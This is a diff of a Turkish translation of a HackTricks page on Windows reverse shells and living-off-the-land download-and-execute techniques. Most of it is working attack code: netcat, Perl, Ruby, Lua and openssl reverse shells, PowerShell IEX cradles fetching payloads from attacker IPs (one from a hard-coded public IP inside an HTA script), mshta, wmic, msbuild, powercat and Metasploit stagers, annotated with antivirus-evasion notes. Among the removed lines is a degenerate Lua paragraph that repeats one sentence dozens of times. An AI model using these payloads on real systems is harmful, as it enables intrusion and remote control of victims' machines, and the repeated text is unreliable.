@@ -2,21 +2,21 @@
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary><strong>Sıfırdan kahramana AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
 * **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi**]'ni(https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'ler**]'imiz(https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
+* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
+* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
 
 **Try Hard Güvenlik Grubu**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -25,7 +25,7 @@ HackTricks'ı desteklemenin diğer yolları:
 ## Lolbas
 
 [lolbas-project.github.io](https://lolbas-project.github.io/) sayfası, Windows için [https://gtfobins.github.io/](https://gtfobins.github.io/) gibi bir şeydir.\
-Açıkçası, **Windows'ta SUID dosyaları veya sudo ayrıcalıkları bulunmamaktadır**, ancak bazı **dizinlerin** nasıl kullanılabileceğini bilmek **yönlendirilmiş** bazı **işlemleri gerçekleştirmek için** oldukça yararlıdır, **keyfi kodları çalıştırmak gibi.**
+Açıkçası, **Windows'ta SUID dosyaları veya sudo ayrıcalıkları yoktur**, ancak bazı **dizinlerin** nasıl kullanılabileceğini bilmek **yönlendirilmiş** bazı **işlemler** gerçekleştirmek için **keyifli olabilir.**
 
 ## NC
 ```bash
@@ -33,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) taşınabilir ve güvenli bir Netcat alternatifidir**. Unix benzeri sistemlerde ve Win32'de çalışır. Güçlü şifreleme, program yürütme, özelleştirilebilir kaynak bağlantı noktaları ve sürekli yeniden bağlantı gibi özelliklere sahip olan sbd, TCP/IP iletişimi için çok yönlü bir çözüm sunar. Windows kullanıcıları için, Kali Linux dağıtımından sbd.exe sürümü, Netcat için güvenilir bir alternatif olarak kullanılabilir.
+**[sbd](https://www.kali.org/tools/sbd/) taşınabilir ve güvenli bir Netcat alternatifidir**. Unix benzeri sistemlerde ve Win32'de çalışır. Güçlü şifreleme, program yürütme, özelleştirilebilir kaynak portları ve sürekli yeniden bağlanma gibi özelliklere sahip olan sbd, TCP/IP iletişimi için çok yönlü bir çözüm sunar. Windows kullanıcıları için, Kali Linux dağıtımındaki sbd.exe sürümü, Netcat için güvenilir bir alternatif olarak kullanılabilir.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -52,27 +52,27 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-Perl, birçok Windows sistemde varsayılan olarak yüklü gelir. Perl betik dili, Windows üzerinde kabuk oluşturmak için kullanılabilir. Perl betikleri genellikle `.pl` uzantılı dosyalarda bulunur. Bir Perl kabuğu oluşturmak için aşağıdaki adımları izleyebilirsiniz:
-
-1. Bir Perl betiği oluşturun veya mevcut bir betiği kullanın.
-2. Perl betiğini hedef Windows sistemine aktarın.
-3. Perl betiğini çalıştırarak bir kabuk oluşturun.
-
-Perl kabukları, Windows sistemine erişim sağlamak ve hedef sistem üzerinde komut çalıştırmak için kullanılabilir.
+Perl, Windows için oldukça popüler bir betikleme dilidir. Perl betikleri, Windows üzerinde hızlı ve etkili bir şekilde çalışabilir. Perl betikleri genellikle dosya işleme, metin işleme ve sistem yönetimi gibi görevler için kullanılır. Perl betikleri, Windows üzerindeki birçok sistem çağrısını doğrudan destekler ve bu da Perl'in Windows üzerinde güçlü bir dil olmasını sağlar. Perl betikleri genellikle `.pl` uzantılı dosyalarda saklanır ve çalıştırılır. Windows'ta Perl betiklerini çalıştırmak için, öncelikle Perl yorumlayıcısını Windows makinenize yüklemeniz gerekir.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-Ruby, açık kaynaklı, nesne yönelimli bir programlama dilidir. Ruby, basit ve okunabilir sözdizimi ile dikkat çeker. Ruby programlama dili, Ruby on Rails çerçevesi ile web uygulamaları geliştirmek için sıkça kullanılır.
+Ruby, açık kaynaklı bir programlama dilidir. Ruby ile Windows üzerinde çalışan bir shell oluşturmak için **msfvenom** kullanılabilir. Örneğin, Ruby ile bir reverse shell oluşturmak için aşağıdaki komutu kullanabilirsiniz:
+
+```plaintext
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f rb > shell.rb
+```
+
+Bu komut, Ruby ile yazılmış bir reverse shell betiği oluşturacaktır. Oluşturulan betiği hedef makinede çalıştırarak bir shell oturumu alabilirsiniz.
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
 
-Lua, bir betik dili ve hafif bir genel amaçlı programlama dili olarak kullanılan bir betik dili motorudur. Lua, C programlama dili ile yazılmıştır ve C API'si ile kolayca entegre edilebilir. Lua, oyun geliştirme endüstrisinde sıkça kullanılan bir dil olup, basit sözdizimi ve hızlı çalışma özellikleriyle bilinir. Lua, Windows işletim sistemi üzerinde çalıştırılabilecek birçok farklı uygulama ve araç için kullanılabilir. Lua betikleri, Windows üzerinde çalıştırılan birçok uygulama ve araçta otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilen Lua betikleri ile Windows üzerinde çalışan birçok uygulama ve araç için otomatik olarak çalıştırılabilir. Lua, Windows üzerinde çalışan bir
+Lua, bir betik dili ve hafif bir çoklu programlama dilidir. Lua, C programlama diline benzer bir sözdizimine sahiptir ve C ile kolayca entegre edilebilir. Lua, oyun geliştirme endüstrisinde sıkça kullanılan bir dil olup, basit ve hızlı bir şekilde betikler yazmak için idealdir. Lua, genellikle oyun motorlarında ve diğer uygulamalarda kullanılan bir betikleme dili olarak tercih edilir.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -84,9 +84,7 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-### Kurban
-
-Windows üzerinde bir hedef bilgisayarın kontrolünü ele geçirmek için kullanılan bir terimdir. Kurban, saldırganın hedef bilgisayar üzerinde istediği işlemleri gerçekleştirmesine olanak tanır.
+Hedef
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -95,8 +93,6 @@ openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_clien
 openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
 ```
 ## Powershell
-
-Powershell, Windows işletim sistemi için geliştirilmiş bir komut satırı aracıdır. Powershell, Windows sistemlerinde otomasyon görevleri gerçekleştirmek için kullanılır. Powershell, geniş bir yelpazede işlevsellik sunar ve sistem yöneticileri tarafından sıkça tercih edilir. Powershell skriptleri, dosya işlemleri, ağ iletişimi, sistem yapılandırması gibi birçok alanda kullanılabilir. Powershell, Windows işletim sistemi üzerinde güçlü bir araçtır ve birçok farklı senaryoda kullanılabilir.
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -109,7 +105,7 @@ Diskte yazılmış yük: **HAYIR** (_en azından procmon kullanarak bulamadığ�
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Ağ çağrısı yapan işlem: **svchost.exe**\
-Diskte yazılan yük: **WebDAV istemci yerel önbelleği**
+Diskte yazılmış yük: **WebDAV istemci yerel önbelleği**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -133,7 +129,7 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Koadic zombi dosyasını stager hta kullanarak çok kolay bir şekilde indirebilir ve çalıştırabilirsiniz**
+**Koadic zombi'sini çok kolay bir şekilde stager hta kullanarak indirebilir ve çalıştırabilirsiniz**
 
 #### hta örneği
 
@@ -171,6 +167,8 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 </scriptlet>
 ```
 #### **Mshta - Metasploit**
+
+Mshta, Microsoft HTML Application Host, is a utility that executes HTA files. Metasploit has a module that can be used to execute malicious payloads through Mshta. This technique can be useful for bypassing application whitelisting or executing code through a trusted Windows utility.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -326,11 +324,11 @@ Hedef:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
-**Algılandı**
+**Tespit Edildi**
 
 ## **Wmic**
 
-* [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) alındı
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
@@ -346,9 +344,9 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 </ms:script>
 </stylesheet>
 ```
-**Algılanmadı**
+**Algılanamaz**
 
-**Koadic zombi dosyasını çok kolay bir şekilde wmic aşamasını kullanarak indirebilir ve çalıştırabilirsiniz**
+**Koadic zombi dosyasını wmic aracılığıyla çok kolay bir şekilde indirebilir ve çalıştırabilirsiniz**
 
 ## Msbuild
 
@@ -356,7 +354,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Bu teknik, Uygulama Beyaz Listesi ve Powershell.exe kısıtlamalarını atlamak için kullanılabilir. Bir PS kabuğu ile karşılaşacaksınız.\
+Bu teknik, Uygulama Beyaz Listeleme ve Powershell.exe kısıtlamalarını atlamak için kullanılabilir. Bir PS kabuğu ile karşılaşacaksınız.\
 Sadece bunu indirin ve çalıştırın: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -365,13 +363,13 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Kurban makinesinde C# kodunu derleyin.
+Kurban makinede C# kodunu derleyin.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
 İşte temel bir C# ters kabuk indirebilirsiniz: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**Tespit edilmedi**
+**Algılanmadı**
 
 ## **Regasm/Regsvc**
 
@@ -403,7 +401,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Kurbanın sonunda betiği çalıştırmak için bir web sunucusunda betiği sunmaya başlayın:
+Sunucuda betiği hizmete başlatın ve kurbanın ucunda çalıştırın:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -419,11 +417,11 @@ Defender henüz kötü amaçlı kod olarak algılamıyor (henüz, 3/04/2019).
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender henüz kötü amaçlı kod olarak algılamıyor (henüz, 3/04/2019).
+**Defender henüz kötü amaçlı kod olarak algılamıyor (ancak, 3/04/2019).**
 
 **Powercat tarafından sunulan diğer seçenekler:**
 
-Bağlama kabukları, Ters kabuk (TCP, UDP, DNS), Port yönlendirme, yükleme/indirme, Yük oluşturma, Dosyaları sunma...
+Bind shell'ler, Ters shell (TCP, UDP, DNS), Port yönlendirme, yükleme/indirme, Payload'lar oluşturma, Dosyalar sunma...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -454,19 +452,19 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Unicorn kullanarak metasploit arka kapısının bir PowerShell versiyonunu oluşturun
+Metasploit arka kapı için unicorn kullanarak bir powershell versiyonu oluşturun
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-Oluşturulan kaynağı kullanarak msfconsole'ı başlatın:
+Oluşturulan kaynakla msfconsole'ı başlatın:
 ```
 msfconsole -r unicorn.rc
 ```
-Kurbanın bilgisayarında aşağıdaki komutu çalıştırarak _powershell\_attack.txt_ dosyasını sunan bir web sunucusu başlatın:
+Hedefte _powershell\_attack.txt_ dosyasını sunan bir web sunucusu başlatın ve aşağıdaki komutu hedefte çalıştırın:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Algılanan kötü amaçlı kod**
+**Tespit edilen zararlı kod**
 
 ## Daha Fazla
 
@@ -486,20 +484,20 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Bazı saldırgan PS modülleri
 ​
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 HackTricks'i desteklemenin diğer yolları:
 
